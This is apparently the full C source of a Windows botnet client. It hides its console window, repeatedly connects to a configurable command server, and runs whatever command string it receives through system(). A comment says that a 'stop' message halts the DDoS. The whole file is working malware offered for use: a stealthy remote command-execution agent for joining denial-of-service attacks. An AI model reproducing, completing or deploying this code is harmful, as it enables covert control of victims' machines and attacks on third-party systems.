#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <windows.h>
#include <wininet.h>
#include <string.h>


#pragma comment(lib, "ws2_32.lib")  //Load ws2_32.dll

void Stealth() {
    HWND Stealth = 0;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}




void changeCMD(char a[], char b[]) {
    for (int i = 0; i < strlen(a); i++) {
        a[i] = 0;
    }
    for (int i = 0; i < strlen(b); i++) {
        a[i] = b[i];
    }
}

int main() {
    //Close the cmd window
    Stealth();
    int count = 0;
    char cmd[MAXBYTE] = { 0 };
    while (1) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        //Create the socket
        SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        //Ask for the connect to the server
        sockaddr_in sockAddr;
        memset(&sockAddr, 0, sizeof(sockAddr));  //All bits are set 0
        sockAddr.sin_family = PF_INET; //To use IPv4 address
        sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Your server's IP Address
        sockAddr.sin_port = htons(1234); //Your IP Port
        
        connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
        //Receive the command from server.
        char s[20] = "";
        itoa(count, s, 10);
        char* str = s;
        //send(sock, str, strlen(str) + sizeof(char), NULL);
        char szBuffer[MAXBYTE] = { 0 };
        recv(sock, szBuffer, MAXBYTE, NULL);
        //Output the command from server
        printf("command from server : %s\n", szBuffer);
        //Close the connect
        closesocket(sock);
        //Stop using the DLL.
        WSACleanup();
        //If the server sends the command to the client.
        if (szBuffer[0] != 0) {
             for (int i = 0; i < MAXBYTE; i++) {
                cmd[i] = 0;
             }
             changeCMD(cmd, szBuffer);
             
        }
        //If you want to stop DDoS.
        if (szBuffer[0] == 's' && szBuffer[1] == 't' && szBuffer[2] == 'o' && szBuffer[3] == 'p') {
            for (int i = 0; i < strlen(cmd); i++) {
                cmd[i] = 0;
            }
        }
        //If the cmd has the command.
        if (cmd[0] != 0) {
            printf("command from temp : %s\n",cmd);
            system(cmd);
            count++;
        }
        /*if (szBuffer[0] != 0) {
            system(szBuffer);
            count++;
        }*/
    }
    return 0;
}
